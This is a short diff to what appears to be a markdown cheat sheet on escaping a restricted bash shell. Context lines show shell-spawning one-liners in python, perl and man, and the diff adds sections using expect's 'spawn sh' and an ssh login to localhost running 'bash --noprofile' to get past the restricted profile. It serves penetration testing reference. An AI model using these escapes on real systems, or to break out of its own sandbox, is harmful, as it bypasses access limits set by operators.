@@ -44,7 +44,7 @@ restired bash
 #### python
 
     python -c "import os; os.system('/bin/sh')"
-
+    
 #### perl
 
     perl -e "system('/bin/sh')"
@@ -83,3 +83,14 @@ restired bash
 
     man man
     !sh
+
+### expect
+
+    expect
+    spawn sh
+    cd /etc
+
+### ssh
+
+    ssh ruser@127.0.0.1  -t "bash --noprofile"
+    cd /etc
